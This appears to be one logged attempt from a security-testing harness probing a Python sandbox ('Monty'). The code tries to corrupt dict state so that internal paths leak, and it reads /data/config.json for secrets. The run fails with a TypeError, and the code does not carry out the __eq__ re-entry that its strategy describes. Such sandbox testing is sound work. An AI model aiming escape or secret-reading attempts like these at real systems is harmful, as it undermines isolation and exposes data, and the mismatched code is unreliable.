# Attempt 029 — 2026-06-03T22:11:42.731244+00:00
## Template: A | Score: 0
## Strategy
Create a dict with tuple keys where one element is a mutable list, then use a lookup key that will trigger __eq__ comparison on that list element. During the __eq__ call, use a closure to mutate the same dict being searched, corrupting the internal hash table indices mid-lookup. Immediately capture any Rust panic or exception that leaks internal file paths from the corrupted dict state.

## Exploit code
```python
from pathlib import Path

# Template A: Dict re-entry via __eq__ during lookup
# Create dict with tuple keys, mutate during comparison

secrets = []

# Create dict with tuple keys containing mutable lists
# Monty may handle tuple hashing differently than CPython
d = {}
marker = [0]

# Build dict with keys that will collide on hash
for i in range(5):
    key = (i % 2, [i])  # Same first element causes hash collision
    d[key] = f"value_{i}"

# Now do lookup that triggers __eq__ on list elements
# During __eq__, mutate the dict to corrupt internal indices
def trigger_lookup():
    # This lookup will compare keys using __eq__
    # If Monty calls user code during comparison, we can mutate
    search_key = (0, [99])
    
    # Mutate dict during the lookup operation
    # Adding key while iterating/comparing corrupts hash table
    try:
        # Force comparison by accessing - this triggers __eq__ on list
        for k in list(d.keys()):
            if k[0] == 0:
                # Mutate dict during iteration - may corrupt state
                d[('new', marker[0])] = 'injected'
                marker[0] += 1
        
        # Now try to access - corrupted state may reveal internals
        result = d.get(search_key, 'not_found')
        secrets.append(f"lookup_result: {result}")
        
    except Exception as e:
        err = str(e)[:200]
        secrets.append(f"dict_error: {err}")
        # Check for path leaks in error
        if '/' in err:
            secrets.append(f"PATH_LEAK: {err}")

# Also try set re-entry (same vulnerability pattern)
s = set()
for i in range(5):
    s.add((i % 2, i))

try:
    # Add during iteration may corrupt set
    for item in list(s):
        s.add(('mut', marker[0]))
        marker[0] += 1
    secrets.append(f"set_size: {len(s)}")
except Exception as e:
    secrets.append(f"set_error: {str(e)[:200]}")

trigger_lookup()

# Try to read config files that may have been exposed
try:
    p = Path('/data/config.json')
    if p.exists():
        content = p.read_text()[:500]
        secrets.append(f"config: {content}")
except Exception as e:
    secrets.append(f"config_err: {str(e)[:100]}")

# Print all captured data
for s in secrets:
    print(s)
```

## Result
Category: standard_error
Details: TypeError: cannot use 'tuple' as a dict key (unhashable type: 'tuple')
Traceback: Traceback (most recent call last):
  File "main.py", line 16, in <module>
    d[key] = f"value_{i}"
    ~~~~~~
TypeErr
```
Success: False
Elapsed: 1026ms
Resumes: 0
Snapshots: 0
Error: TypeError: cannot use 'tuple' as a dict key (unhashable type: 'tuple')
Traceback: Traceback (most recent call last):
  File "main.py", line 16, in <module>
    d[key] = f"value_{i}"
    ~~~~~~
TypeError: cannot use 'tuple' as a dict key (unhashable type: 'tuple')
Print: 
```

## Analysis
- Error: TypeError: cannot use 'tuple' as a dict key (unhashable type: 'tuple')
Traceback: Traceback (most recent call last):
  File "main.py", line 16, in <mo
- **Verdict**: Not exploitable
